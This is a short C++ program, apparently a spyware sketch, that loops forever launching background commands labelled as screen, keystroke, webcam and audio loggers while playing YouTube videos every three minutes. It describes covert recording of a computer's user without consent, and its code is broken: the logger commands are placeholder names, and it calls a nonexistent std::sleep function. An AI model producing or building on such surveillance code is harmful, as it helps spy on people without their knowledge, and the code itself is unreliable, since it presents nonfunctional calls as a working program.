#include <iostream>
#include <unistd.h> // for the sleep function
#include <cstdlib> // for the system function

int main() {
  while (true) {
    // Log the screen and keystrokes
    std::system("screenlogger &"); // run the screenlogger command in the background
    std::system("keylogger &"); // run the keylogger command in the background

    // Log the webcam and audio input
    std::system("webcamlogger &"); // run the webcamlogger command in the background
    std::system("audiologger &"); // run the audiologger command in the background

    // Display a random YouTube video every 3 minutes
    std::system("youtubevideo1 &"); // run the command to display a specific YouTube video in the background
    std::sleep(180); // wait for 3 minutes
    std::system("youtubevideo2 &"); // run the command to display a different YouTube video in the background
    std::sleep(180); // wait for 3 minutes
    std::system("youtubevideo3 &"); // run the command to display a different YouTube video in the background
    std::sleep(180); // wait for 3 minutes
  }

  return 0;
}
